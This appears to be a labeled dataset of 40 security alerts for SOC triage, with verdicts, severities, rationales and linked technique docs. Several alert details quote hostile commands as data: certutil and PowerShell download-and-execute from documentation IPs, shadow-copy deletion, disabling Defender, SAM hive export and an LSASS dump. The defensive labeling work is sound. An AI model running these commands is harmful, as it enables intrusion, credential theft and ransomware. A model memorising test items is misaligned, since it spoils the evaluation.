@@ -1,0 +1,832 @@
+[
+  {
+    "id": "A001",
+    "alert": {
+      "timestamp": "2026-10-03T14:22:00Z",
+      "source": "Identity Provider",
+      "host": "IDP",
+      "user": "mlopez",
+      "title": "Multiple failed sign-ins followed by success",
+      "details": "47 failed sign-ins for mlopez from 203.0.113.45 in 6 minutes, then 1 successful sign-in. Source IP not previously seen for this user."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "brute_force",
+      "severity": "high",
+      "rationale": "Burst of failures then a success from an unknown IP suggests the password was guessed."
+    },
+    "relevant_docs": [
+      "T1110_brute_force.md",
+      "T1078_valid_accounts.md"
+    ]
+  },
+  {
+    "id": "A002",
+    "alert": {
+      "timestamp": "2026-10-04T09:10:00Z",
+      "source": "Identity Provider",
+      "host": "IDP",
+      "user": "multiple",
+      "title": "Failed sign-ins across many accounts",
+      "details": "Failed sign-ins for 120 different accounts from 198.51.100.23 over 30 minutes, 1-2 attempts per account, no successes."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "brute_force",
+      "severity": "medium",
+      "rationale": "Password spraying pattern. No success yet, so containment is blocking the source and watching for success."
+    },
+    "relevant_docs": [
+      "T1110_brute_force.md"
+    ]
+  },
+  {
+    "id": "A003",
+    "alert": {
+      "timestamp": "2026-10-04T11:45:00Z",
+      "source": "Email Gateway",
+      "host": "MAIL-GW",
+      "user": "3 recipients",
+      "title": "User-reported suspicious email",
+      "details": "Email from it-support@c0mpany-helpdesk.example (lookalike domain, registered 2 days ago), SPF fail, link to a login page on an unrelated domain. 3 recipients, 1 click recorded, no credentials entered per proxy logs."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "phishing",
+      "severity": "medium",
+      "rationale": "Failed authentication and lookalike domain. A click occurred but no credentials were entered."
+    },
+    "relevant_docs": [
+      "T1566_phishing.md",
+      "playbook_user_reported_phishing.md"
+    ]
+  },
+  {
+    "id": "A004",
+    "alert": {
+      "timestamp": "2026-10-05T08:31:00Z",
+      "source": "Web Proxy",
+      "host": "PROXY",
+      "user": "tnguyen",
+      "title": "Credentials posted to suspected phishing page",
+      "details": "User tnguyen submitted a form with username and password to a fake Microsoft sign-in page on login-m365-verify.example. Password has not been reset."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "phishing",
+      "severity": "high",
+      "rationale": "Credentials were entered on a phishing page. The account must be treated as compromised."
+    },
+    "relevant_docs": [
+      "T1566_phishing.md",
+      "playbook_user_reported_phishing.md",
+      "T1078_valid_accounts.md"
+    ]
+  },
+  {
+    "id": "A005",
+    "alert": {
+      "timestamp": "2026-10-05T13:02:00Z",
+      "source": "EDR",
+      "host": "WKS-014",
+      "user": "jdoe",
+      "title": "Office application spawned PowerShell",
+      "details": "winword.exe launched powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcA... (long base64 string). Parent document opened from an email attachment."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "scripting",
+      "severity": "high",
+      "rationale": "Office parent process plus hidden window and encoded command is classic malicious macro execution."
+    },
+    "relevant_docs": [
+      "T1059_command_and_scripting.md",
+      "playbook_suspicious_powershell.md",
+      "T1566_phishing.md"
+    ]
+  },
+  {
+    "id": "A006",
+    "alert": {
+      "timestamp": "2026-10-06T10:18:00Z",
+      "source": "EDR",
+      "host": "WKS-027",
+      "user": "bsmith",
+      "title": "Script downloads and runs executable",
+      "details": "wscript.exe from the Downloads folder launched cmd.exe /c certutil -urlcache -f http://203.0.113.77/a.exe C:\\Users\\Public\\a.exe && C:\\Users\\Public\\a.exe"
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "tool_transfer",
+      "severity": "high",
+      "rationale": "A script downloaded a payload from an external IP and executed it immediately."
+    },
+    "relevant_docs": [
+      "T1105_ingress_tool_transfer.md",
+      "T1059_command_and_scripting.md"
+    ]
+  },
+  {
+    "id": "A007",
+    "alert": {
+      "timestamp": "2026-10-06T22:47:00Z",
+      "source": "EDR",
+      "host": "FS-02",
+      "user": "svc-backup2",
+      "title": "LSASS memory access by unsigned tool",
+      "details": "Unsigned procdump64.exe run from C:\\Users\\Public opened lsass.exe with full access. File lsass.dmp created in the same folder. Host is a file server."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "credential_dumping",
+      "severity": "critical",
+      "rationale": "Credential dump on a server may expose many accounts. Immediate isolation and credential reset needed."
+    },
+    "relevant_docs": [
+      "T1003_credential_dumping.md"
+    ]
+  },
+  {
+    "id": "A008",
+    "alert": {
+      "timestamp": "2026-10-07T01:12:00Z",
+      "source": "Sysmon",
+      "host": "WKS-033",
+      "user": "helpdesk2",
+      "title": "Registry hive export",
+      "details": "reg save HKLM\\SAM and HKLM\\SYSTEM to C:\\Temp by user helpdesk2 at 01:12. The account does not normally perform admin work."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "credential_dumping",
+      "severity": "high",
+      "rationale": "Exporting SAM and SYSTEM hives is a credential access technique, done off-hours by an unexpected account."
+    },
+    "relevant_docs": [
+      "T1003_credential_dumping.md"
+    ]
+  },
+  {
+    "id": "A009",
+    "alert": {
+      "timestamp": "2026-10-07T03:40:00Z",
+      "source": "EDR",
+      "host": "FS-02",
+      "user": "svc-sql",
+      "title": "Shadow copies deleted then mass file rename",
+      "details": "vssadmin delete shadows /all /quiet executed by powershell.exe, followed by 2,300 files renamed with the .locked extension in 4 minutes."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "ransomware",
+      "severity": "critical",
+      "rationale": "Backup deletion plus mass renames means active ransomware encryption."
+    },
+    "relevant_docs": [
+      "T1486_data_encrypted_for_impact.md",
+      "playbook_ransomware_indicators.md"
+    ]
+  },
+  {
+    "id": "A010",
+    "alert": {
+      "timestamp": "2026-10-07T03:52:00Z",
+      "source": "File Integrity Monitor",
+      "host": "FS-02",
+      "user": "multiple",
+      "title": "Ransom note files created",
+      "details": "File README_RESTORE.txt created in 40 folders on a shared drive within 3 minutes. Users report documents cannot be opened."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "ransomware",
+      "severity": "critical",
+      "rationale": "Ransom notes across shares with inaccessible documents confirm ransomware."
+    },
+    "relevant_docs": [
+      "T1486_data_encrypted_for_impact.md",
+      "playbook_ransomware_indicators.md"
+    ]
+  },
+  {
+    "id": "A011",
+    "alert": {
+      "timestamp": "2026-10-08T15:25:00Z",
+      "source": "EDR",
+      "host": "WKS-019",
+      "user": "akim",
+      "title": "Suspicious scheduled task created",
+      "details": "schtasks /create /tn WindowsUpdateCheck /tr C:\\Users\\Public\\upd.exe /sc onlogon /ru SYSTEM created from a standard user session. upd.exe is unsigned."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "scheduled_task",
+      "severity": "high",
+      "rationale": "Task mimics a Windows name but runs an unsigned binary from a user-writable folder as SYSTEM."
+    },
+    "relevant_docs": [
+      "T1053_scheduled_task_job.md"
+    ]
+  },
+  {
+    "id": "A012",
+    "alert": {
+      "timestamp": "2026-10-08T16:03:00Z",
+      "source": "EDR",
+      "host": "WKS-052",
+      "user": "rpark",
+      "title": "New autostart registry entry",
+      "details": "New value OneDriveSync under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run = powershell -w hidden -file C:\\Users\\Public\\s.ps1, created by winword.exe."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "autostart",
+      "severity": "high",
+      "rationale": "Persistence set by an Office process and pointing to a hidden script in a public folder."
+    },
+    "relevant_docs": [
+      "T1547_boot_or_logon_autostart.md",
+      "T1059_command_and_scripting.md"
+    ]
+  },
+  {
+    "id": "A013",
+    "alert": {
+      "timestamp": "2026-10-09T09:55:00Z",
+      "source": "EDR",
+      "host": "WKS-061",
+      "user": "dchen",
+      "title": "Real-time protection disabled",
+      "details": "Set-MpPreference -DisableRealtimeMonitoring $true executed from a script by a standard user. No change ticket."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "impair_defenses",
+      "severity": "high",
+      "rationale": "Disabling real-time protection by a non-admin script is defense evasion."
+    },
+    "relevant_docs": [
+      "T1562_impair_defenses.md"
+    ]
+  },
+  {
+    "id": "A014",
+    "alert": {
+      "timestamp": "2026-10-09T14:30:00Z",
+      "source": "EDR",
+      "host": "WKS-070",
+      "user": "tmiller",
+      "title": "Antivirus exclusion for entire drive",
+      "details": "An exclusion for C:\\ was added to the antivirus policy on this host by user tmiller. No ticket and no other suspicious activity seen."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "impair_defenses",
+      "severity": "medium",
+      "rationale": "Excluding a whole drive is unjustified without a ticket. No other signs yet, so medium."
+    },
+    "relevant_docs": [
+      "T1562_impair_defenses.md"
+    ]
+  },
+  {
+    "id": "A015",
+    "alert": {
+      "timestamp": "2026-10-10T12:14:00Z",
+      "source": "EDR",
+      "host": "WKS-038",
+      "user": "lgarcia",
+      "title": "PowerShell download then execution",
+      "details": "powershell.exe Invoke-WebRequest to http://198.51.100.9/tool.exe saved to C:\\ProgramData\\tool.exe, executed 8 seconds later."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "tool_transfer",
+      "severity": "high",
+      "rationale": "Download and execute from a raw IP address by a script is payload delivery."
+    },
+    "relevant_docs": [
+      "T1105_ingress_tool_transfer.md",
+      "T1059_command_and_scripting.md"
+    ]
+  },
+  {
+    "id": "A016",
+    "alert": {
+      "timestamp": "2026-10-10T02:14:00Z",
+      "source": "Windows Security",
+      "host": "SRV-DC01",
+      "user": "kpatel",
+      "title": "RDP logon to domain controller",
+      "details": "Logon type 10 to SRV-DC01 from WKS-031 by standard user kpatel at 02:14. First time this user has accessed this server."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "remote_services",
+      "severity": "high",
+      "rationale": "A standard user reaching a domain controller by RDP at night from a workstation is unusual and risky."
+    },
+    "relevant_docs": [
+      "T1021_remote_services.md",
+      "T1078_valid_accounts.md"
+    ]
+  },
+  {
+    "id": "A017",
+    "alert": {
+      "timestamp": "2026-10-11T11:20:00Z",
+      "source": "Windows Security",
+      "host": "WKS-022",
+      "user": "svc-backup",
+      "title": "One account logging in to many hosts",
+      "details": "svc-backup authenticated over SMB to 25 hosts within 10 minutes, all from workstation WKS-022. This service account normally logs in from the backup server only."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "remote_services",
+      "severity": "high",
+      "rationale": "Fan-out from an unusual source host suggests the account is being used for lateral movement."
+    },
+    "relevant_docs": [
+      "T1021_remote_services.md",
+      "T1078_valid_accounts.md"
+    ]
+  },
+  {
+    "id": "A018",
+    "alert": {
+      "timestamp": "2026-10-11T15:48:00Z",
+      "source": "IDS",
+      "host": "WKS-044",
+      "user": "ahall",
+      "title": "Internal port scan",
+      "details": "WKS-044 connected to 254 IPs on port 445 within 90 seconds. Process nmap.exe was launched from the user's Downloads folder."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "network_discovery",
+      "severity": "medium",
+      "rationale": "A user workstation running a scanner is discovery activity. No follow-up exploitation seen yet."
+    },
+    "relevant_docs": [
+      "T1046_network_service_discovery.md"
+    ]
+  },
+  {
+    "id": "A019",
+    "alert": {
+      "timestamp": "2026-10-12T03:05:00Z",
+      "source": "Windows Security",
+      "host": "SRV-APP03",
+      "user": "admin_tmp",
+      "title": "Security event log cleared",
+      "details": "Event ID 1102 (audit log cleared) on SRV-APP03 by admin_tmp at 03:05. No change ticket."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "indicator_removal",
+      "severity": "high",
+      "rationale": "Unexplained log clearing is typically done to hide activity."
+    },
+    "relevant_docs": [
+      "T1070_indicator_removal.md"
+    ]
+  },
+  {
+    "id": "A020",
+    "alert": {
+      "timestamp": "2026-10-12T17:30:00Z",
+      "source": "Identity Provider",
+      "host": "IDP",
+      "user": "rjones",
+      "title": "Impossible travel with MFA fatigue",
+      "details": "Sign-in for rjones from Lagos 3 minutes after a sign-in from Orlando. MFA was approved after 9 prompts in 4 minutes. User did not report any travel."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "valid_accounts",
+      "severity": "high",
+      "rationale": "Impossible travel plus MFA fatigue indicates an account takeover."
+    },
+    "relevant_docs": [
+      "T1078_valid_accounts.md",
+      "playbook_suspicious_login.md"
+    ]
+  },
+  {
+    "id": "A021",
+    "alert": {
+      "timestamp": "2026-10-13T10:05:00Z",
+      "source": "Email Audit",
+      "host": "MAIL",
+      "user": "cwood",
+      "title": "New inbox forwarding rule",
+      "details": "After a sign-in from an unfamiliar IP, an inbox rule was created forwarding all mail to an external address (cwood.archive@mailbox-free.example)."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "valid_accounts",
+      "severity": "high",
+      "rationale": "External forwarding created after an unfamiliar login is common in mailbox compromise."
+    },
+    "relevant_docs": [
+      "T1078_valid_accounts.md",
+      "playbook_suspicious_login.md"
+    ]
+  },
+  {
+    "id": "A022",
+    "alert": {
+      "timestamp": "2026-10-13T01:30:00Z",
+      "source": "Firewall",
+      "host": "FS-01",
+      "user": "svc-sync",
+      "title": "Large upload to unknown file-sharing service",
+      "details": "FS-01 uploaded 14 GB to filedrop.example.net at 01:30. rclone.exe observed running on the host."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "data_exfiltration",
+      "severity": "high",
+      "rationale": "Large night-time transfer to an unapproved service with rclone suggests data theft."
+    },
+    "relevant_docs": [
+      "playbook_data_exfiltration.md"
+    ]
+  },
+  {
+    "id": "A023",
+    "alert": {
+      "timestamp": "2026-10-14T19:12:00Z",
+      "source": "EDR",
+      "host": "WKS-081",
+      "user": "hr_user3",
+      "title": "Data staged and sent out",
+      "details": "7z.exe created a 3.2 GB archive in C:\\Temp from the HR share, followed by outbound HTTPS to 198.51.100.60 (no prior history)."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "data_exfiltration",
+      "severity": "high",
+      "rationale": "Staging sensitive data into an archive then sending it to a new destination is exfiltration."
+    },
+    "relevant_docs": [
+      "playbook_data_exfiltration.md"
+    ]
+  },
+  {
+    "id": "A024",
+    "alert": {
+      "timestamp": "2026-10-14T09:44:00Z",
+      "source": "EDR",
+      "host": "WKS-090",
+      "user": "nfox",
+      "title": "Malware blocked on download",
+      "details": "EDR blocked and quarantined a file detected as Trojan.GenericKD immediately after browser download. File did not execute. No other activity."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "malware",
+      "severity": "low",
+      "rationale": "Real malware, but blocked before running. Low severity with a check for other hosts."
+    },
+    "relevant_docs": [
+      "playbook_malware_on_endpoint.md"
+    ]
+  },
+  {
+    "id": "A025",
+    "alert": {
+      "timestamp": "2026-10-15T13:20:00Z",
+      "source": "EDR",
+      "host": "WKS-095",
+      "user": "vmoore",
+      "title": "Malware executed with persistence and callbacks",
+      "details": "EDR detected loader behavior: process executed, new Run key added, outbound connections to 203.0.113.99 every 60 seconds."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "malware",
+      "severity": "high",
+      "rationale": "Executed malware with persistence and beaconing is an active infection."
+    },
+    "relevant_docs": [
+      "playbook_malware_on_endpoint.md",
+      "T1547_boot_or_logon_autostart.md"
+    ]
+  },
+  {
+    "id": "A026",
+    "alert": {
+      "timestamp": "2026-10-15T23:50:00Z",
+      "source": "Windows Security",
+      "host": "SRV-WEB01",
+      "user": "administrator",
+      "title": "Brute force on internet-facing RDP then success",
+      "details": "900 failed logons from 198.51.100.200 against SRV-WEB01 (RDP exposed to the internet), followed by a successful logon as administrator."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "brute_force",
+      "severity": "critical",
+      "rationale": "A successful admin login after brute force on an exposed server is a likely full compromise."
+    },
+    "relevant_docs": [
+      "T1110_brute_force.md",
+      "T1021_remote_services.md",
+      "T1078_valid_accounts.md"
+    ]
+  },
+  {
+    "id": "A027",
+    "alert": {
+      "timestamp": "2026-10-16T10:30:00Z",
+      "source": "EDR",
+      "host": "WKS-101",
+      "user": "pyoung",
+      "title": "Macro document spawned command shell",
+      "details": "User opened invoice.docm from an external sender. winword.exe then launched cmd.exe running a download command."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "phishing",
+      "severity": "high",
+      "rationale": "Malicious attachment executed commands via macro."
+    },
+    "relevant_docs": [
+      "T1566_phishing.md",
+      "T1059_command_and_scripting.md",
+      "playbook_user_reported_phishing.md"
+    ]
+  },
+  {
+    "id": "A028",
+    "alert": {
+      "timestamp": "2026-10-16T21:15:00Z",
+      "source": "EDR",
+      "host": "SRV-DB02",
+      "user": "svc-sql",
+      "title": "Security agent stopped and uninstall attempted",
+      "details": "The EDR agent service was stopped and an uninstall attempted on SRV-DB02 through a remote session by svc-sql."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "impair_defenses",
+      "severity": "high",
+      "rationale": "Attempt to remove the EDR agent over a remote session, often a step before ransomware."
+    },
+    "relevant_docs": [
+      "T1562_impair_defenses.md",
+      "playbook_ransomware_indicators.md"
+    ]
+  },
+  {
+    "id": "A029",
+    "alert": {
+      "timestamp": "2026-10-17T08:52:00Z",
+      "source": "EDR",
+      "host": "WKS-110",
+      "user": "sreed",
+      "title": "Script host runs email-delivered JavaScript",
+      "details": "wscript.exe ran invoice.js launched from the email client, then made a connection to a rarely seen domain."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "scripting",
+      "severity": "high",
+      "rationale": "Script delivered by email with an outbound connection is likely a downloader."
+    },
+    "relevant_docs": [
+      "T1059_command_and_scripting.md",
+      "T1566_phishing.md"
+    ]
+  },
+  {
+    "id": "A030",
+    "alert": {
+      "timestamp": "2026-10-17T14:41:00Z",
+      "source": "EDR",
+      "host": "WKS-115",
+      "user": "mbrooks",
+      "title": "BITS job downloads DLL",
+      "details": "bitsadmin /transfer downloaded update.dll from 203.0.113.150 to %TEMP%. The DLL has not yet been loaded."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "tool_transfer",
+      "severity": "medium",
+      "rationale": "Download of a DLL from an unknown IP with a built-in tool. Not yet executed."
+    },
+    "relevant_docs": [
+      "T1105_ingress_tool_transfer.md"
+    ]
+  },
+  {
+    "id": "A031",
+    "alert": {
+      "timestamp": "2026-10-18T16:22:00Z",
+      "source": "Windows Security",
+      "host": "WKS-019",
+      "user": "remote-admin",
+      "title": "New service created remotely",
+      "details": "New service WinSvcHost pointing to C:\\Users\\Public\\svc.exe created on WKS-019 through a remote admin session from WKS-022."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "autostart",
+      "severity": "high",
+      "rationale": "A remotely created service pointing to a user-writable path is persistence and lateral movement."
+    },
+    "relevant_docs": [
+      "T1547_boot_or_logon_autostart.md",
+      "T1021_remote_services.md"
+    ]
+  },
+  {
+    "id": "A032",
+    "alert": {
+      "timestamp": "2026-10-18T07:30:00Z",
+      "source": "Identity Provider",
+      "host": "IDP",
+      "user": "former.employee",
+      "title": "Dormant account sign-in",
+      "details": "Account former.employee, inactive for 214 days, signed in through VPN and accessed a file share."
+    },
+    "label": {
+      "verdict": "true_positive",
+      "category": "valid_accounts",
+      "severity": "medium",
+      "rationale": "Dormant accounts reactivating is suspicious. Medium until the account owner status is confirmed."
+    },
+    "relevant_docs": [
+      "T1078_valid_accounts.md"
+    ]
+  },
+  {
+    "id": "A033",
+    "alert": {
+      "timestamp": "2026-10-19T02:00:00Z",
+      "source": "EDR",
+      "host": "60 hosts",
+      "user": "rmm-agent",
+      "title": "Encoded PowerShell from management agent",
+      "details": "powershell.exe -enc ... launched by the RMM agent (signed binary in Program Files) on 60 hosts at 02:00. Matches maintenance window ticket CHG-1042."
+    },
+    "label": {
+      "verdict": "benign",
+      "category": "benign",
+      "severity": "informational",
+      "rationale": "Known RMM tool, signed binary, expected window and ticket, same pattern across hosts."
+    },
+    "relevant_docs": [
+      "playbook_false_positives_msp.md",
+      "T1059_command_and_scripting.md"
+    ]
+  },
+  {
+    "id": "A034",
+    "alert": {
+      "timestamp": "2026-10-19T10:15:00Z",
+      "source": "Identity Provider",
+      "host": "IDP",
+      "user": "asmith",
+      "title": "Repeated failed sign-ins",
+      "details": "12 failed sign-ins for asmith from her usual laptop at steady 5-minute intervals after her password changed yesterday. Mobile mail app retrying with the old password."
+    },
+    "label": {
+      "verdict": "benign",
+      "category": "benign",
+      "severity": "informational",
+      "rationale": "Known device, steady rhythm, recent password change. A stale saved credential."
+    },
+    "relevant_docs": [
+      "T1110_brute_force.md",
+      "playbook_false_positives_msp.md"
+    ]
+  },
+  {
+    "id": "A035",
+    "alert": {
+      "timestamp": "2026-10-20T01:00:00Z",
+      "source": "IDS",
+      "host": "scanner-01",
+      "user": "svc-scan",
+      "title": "Network scan from internal host",
+      "details": "scanner-01 (10.0.5.10, approved vulnerability scanner) probed 500 hosts on ports 1-1024 during the scheduled Sunday 01:00 scan."
+    },
+    "label": {
+      "verdict": "benign",
+      "category": "benign",
+      "severity": "informational",
+      "rationale": "Approved scanner from a known host on its schedule."
+    },
+    "relevant_docs": [
+      "T1046_network_service_discovery.md",
+      "playbook_false_positives_msp.md"
+    ]
+  },
+  {
+    "id": "A036",
+    "alert": {
+      "timestamp": "2026-10-20T11:30:00Z",
+      "source": "EDR",
+      "host": "WKS-120",
+      "user": "SYSTEM",
+      "title": "LSASS memory read by security software",
+      "details": "A signed endpoint security agent binary from its standard install path read lsass.exe memory during a scheduled scan."
+    },
+    "label": {
+      "verdict": "benign",
+      "category": "benign",
+      "severity": "informational",
+      "rationale": "Signed, expected product behavior from a known path."
+    },
+    "relevant_docs": [
+      "T1003_credential_dumping.md",
+      "playbook_false_positives_msp.md"
+    ]
+  },
+  {
+    "id": "A037",
+    "alert": {
+      "timestamp": "2026-10-21T14:02:00Z",
+      "source": "Monitoring",
+      "host": "500 hosts",
+      "user": "n/a",
+      "title": "Mass agent offline alerts",
+      "details": "500 endpoint agents reported offline at 14:02 and reconnected between 15:00 and 15:10. The cloud provider status page reports an incident in the region."
+    },
+    "label": {
+      "verdict": "benign",
+      "category": "benign",
+      "severity": "informational",
+      "rationale": "Uniform drop and recovery across many hosts matching a vendor outage, not an attack."
+    },
+    "relevant_docs": [
+      "playbook_false_positives_msp.md"
+    ]
+  },
+  {
+    "id": "A038",
+    "alert": {
+      "timestamp": "2026-10-21T22:10:00Z",
+      "source": "Windows Security",
+      "host": "20 servers",
+      "user": "tech_rivera",
+      "title": "RDP to many servers",
+      "details": "tech_rivera connected by RDP from admin workstation ADM-01 to 20 servers within 2 hours during the approved patch window, ticket CHG-1050."
+    },
+    "label": {
+      "verdict": "benign",
+      "category": "benign",
+      "severity": "informational",
+      "rationale": "Known admin, known source, approved change and window."
+    },
+    "relevant_docs": [
+      "T1021_remote_services.md",
+      "playbook_false_positives_msp.md"
+    ]
+  },
+  {
+    "id": "A039",
+    "alert": {
+      "timestamp": "2026-10-22T09:40:00Z",
+      "source": "EDR",
+      "host": "WKS-130",
+      "user": "SYSTEM",
+      "title": "New scheduled task from installer",
+      "details": "Scheduled task ContosoUpdate created by the installer of an approved software package, running a signed binary from Program Files."
+    },
+    "label": {
+      "verdict": "benign",
+      "category": "benign",
+      "severity": "informational",
+      "rationale": "Standard installer behavior with a signed binary in a normal path."
+    },
+    "relevant_docs": [
+      "T1053_scheduled_task_job.md",
+      "playbook_false_positives_msp.md"
+    ]
+  },
+  {
+    "id": "A040",
+    "alert": {
+      "timestamp": "2026-10-22T16:25:00Z",
+      "source": "Identity Provider",
+      "host": "IDP",
+      "user": "dlee",
+      "title": "Sign-in from a new country",
+      "details": "dlee signed in from Berlin using their usual device and completed MFA themselves. HR travel record shows a business trip this week."
+    },
+    "label": {
+      "verdict": "benign",
+      "category": "benign",
+      "severity": "informational",
+      "rationale": "Travel confirmed by records, same device, user completed MFA."
+    },
+    "relevant_docs": [
+      "T1078_valid_accounts.md",
+      "playbook_suspicious_login.md"
+    ]
+  }
+]
